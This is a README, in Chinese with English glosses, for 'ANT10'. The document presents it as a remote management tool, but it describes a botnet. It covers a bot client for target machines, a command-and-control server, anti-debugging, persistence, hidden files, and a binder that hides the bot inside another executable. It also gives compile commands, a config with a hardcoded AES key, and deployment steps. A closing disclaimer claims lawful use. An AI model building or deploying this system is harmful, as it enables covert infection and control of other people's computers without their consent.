# ANT10 远程管理系统 (ANT10 Remote Management System)

ANT10是一个高级远程管理系统 (Advanced Remote Management System)，提供安全的远程命令执行 (Remote Command Execution) 和系统监控 (System Monitoring) 功能。该系统采用客户端-服务器架构 (Client-Server Architecture)，通过加密通信 (Encrypted Communication) 确保数据传输安全。

## 系统架构 (System Architecture)

ANT10系统由以下主要组件构成：

1. **Bot客户端 (Bot Client)**：部署在目标系统上的轻量级客户端
2. **C2服务器 (Command & Control Server)**：中央命令与控制服务器
3. **通信模块 (Communication Module)**：处理加密通信的组件
4. **传播工具 (Propagation Tools)**：用于部署客户端的辅助工具

### 系统流程图

```
+-------------+      加密通信      +-------------+
|  Bot客户端  | <----------------> |  C2服务器   |
+-------------+                    +-------------+
      |                                  |
      | - 执行命令                       | - 发送命令
      | - 收集系统信息                   | - 管理客户端
      | - 持久化安装                     | - 处理结果
      |                                  |
```

## 主要组件

### Bot客户端 (Bot Client)

Bot客户端是部署在目标系统上的核心组件，具有以下功能：

- **命令执行 (Command Execution)**：执行从C2服务器接收的命令
- **系统信息收集 (System Information Collection)**：收集并报告系统信息
- **持久化安装 (Persistence Installation)**：通过多种机制确保系统重启后继续运行
- **安全检测 (Security Checks)**：实现反调试和环境检测功能
- **加密通信 (Encrypted Communication)**：使用AES加密与服务器通信

主要文件：
- `bot/bot.c`：主程序入口
- `bot/command.c`：命令处理功能
- `bot/persistence.c`：持久化安装机制
- `bot/security_checks.c`：安全检测功能
- `bot/network.c`：网络通信功能

### C2服务器 (Command & Control Server)

命令与控制服务器是系统的中央管理组件，具有以下功能：

- **Bot管理 (Bot Management)**：管理连接的Bot客户端
- **命令分发 (Command Distribution)**：向Bot客户端发送命令
- **结果处理 (Result Processing)**：接收并处理Bot客户端返回的结果
- **控制台界面 (Console UI)**：提供管理员操作界面

主要文件：
- `c2_server/main.c`：服务器主程序
- `c2_server/bot_manager.c`：Bot客户端管理
- `c2_server/network.c`：网络通信处理
- `c2_server/console_ui.c`：控制台用户界面
- `c2_server/c2_config.json`：服务器配置文件

### 通信模块 (Communication Module)

通信模块处理客户端和服务器之间的加密数据传输：

- **加密实现 (Encryption Implementation)**：AES加密算法
- **网络工具 (Network Utilities)**：处理网络连接和数据传输

主要文件：
- `comm/crypto.c`：加密功能实现
- `comm/net_util.c`：网络工具函数

### 传播工具 (Propagation Tools)

传播工具用于辅助部署Bot客户端：

- **文件捆绑器 (File Binder)**：将多个可执行文件捆绑为一个
- **存根加载器 (Stub Loader)**：从捆绑文件中提取并执行程序

主要文件：
- `prop/binder.c`：文件捆绑器
- `prop/stubloader.c`：存根加载器

## 安装与使用 (Installation & Usage)

### 编译 (Compilation)

#### 编译Bot客户端

```bash
x86_64-w64-mingw32-gcc $(find ./bot ./comm -name '*.c' -not -name '*_test.c') -o bot.exe \
-D_WIN32_WINNT=0x0A00 -DUNICODE -D_UNICODE \
-I/usr/x86_64-w64-mingw32/include \
-I/usr/x86_64-w64-mingw32/include/jansson \
-L/usr/x86_64-w64-mingw32/lib -lshlwapi \
-liphlpapi -ladvapi32 -lws2_32 -lcrypt32 -ljansson -lktmw32 \
-static -Wno-deprecated-declarations -fno-stack-protector -O0
```

#### 编译C2服务器

```bash
x86_64-w64-mingw32-gcc ./c2_server/main.c ./comm/net_util.c ./comm/net_util.h ./c2_server/network.c \
./comm/crypto.c ./comm/crypto.h \
./c2_server/bot_manager.c ./c2_server/config.c ./c2_server/console_ui.c -o c2.exe \
-D_WIN32_WINNT=0x0A00 \
-I/usr/x86_64-w64-mingw32/include \
-L/usr/x86_64-w64-mingw32/lib \
-lws2_32 -ljansson -lkernel32 -ladvapi32 -lntdll \
-static -Wno-deprecated-declarations -fno-stack-protector -O0
```

#### 编译传播工具

```bash
# 编译文件捆绑器
x86_64-w64-mingw32-gcc ./prop/binder.c -o binder.exe

# 编译存根加载器
x86_64-w64-mingw32-gcc ./prop/stubloader.c -o stubloader.exe -nostdlib -lkernel32 -luser32 -s -Os -Wl,--entry=_mainCRTStartup
```

### 配置 (Configuration)

1. 修改`c2_server/c2_config.json`文件以配置服务器：
   ```json
   {
     "tls_cert_file": "server.crt",
     "tls_key_file": "server.key",
     "aes_key": "2B7E151628AED2A6ABF7158809CF4F3C",
     "valid_ua": "Mozilla/5.0",
     "api_endpoint": "/api/v1"
   }
   ```

2. 确保TLS证书和密钥文件存在于正确位置。

### 使用 (Usage)

1. **启动C2服务器 (Start C2 Server)**：
   ```
   ./c2_server.exe
   ```

2. **部署Bot客户端 (Deploy Bot Client)**：
   - 直接运行：`bot.exe`
   - 使用捆绑器：
     ```
     ./binder.exe stubloader.exe bot.exe 目标程序.exe 输出文件.exe
     ```

3. **通过C2服务器控制台管理Bot客户端 (Manage Bot Clients via C2 Console)**：
   - 查看连接的客户端
   - 发送命令
   - 查看命令执行结果

## 安全注意事项 (Security Considerations)

1. **加密通信 (Encrypted Communication)**：所有通信使用AES加密和TLS保护。
2. **反调试机制 (Anti-Debugging)**：Bot客户端包含反调试功能，防止分析。
3. **持久化安装 (Persistence Installation)**：Bot客户端使用多种机制确保持久性。
4. **文件保护 (File Protection)**：安装后的文件使用隐藏和系统属性进行保护。

## 系统要求 (System Requirements)

- Windows 10或更高版本 (Windows 10 or later)
- 64位操作系统 (64-bit Operating System)
- 管理员权限（用于某些功能）(Administrator Privileges for certain features)

## 免责声明 (Disclaimer)

本系统仅用于合法的系统管理和安全研究目的。使用者必须遵守所有适用的法律法规，并获得适当的授权。未经授权在他人系统上使用本软件可能违反法律。
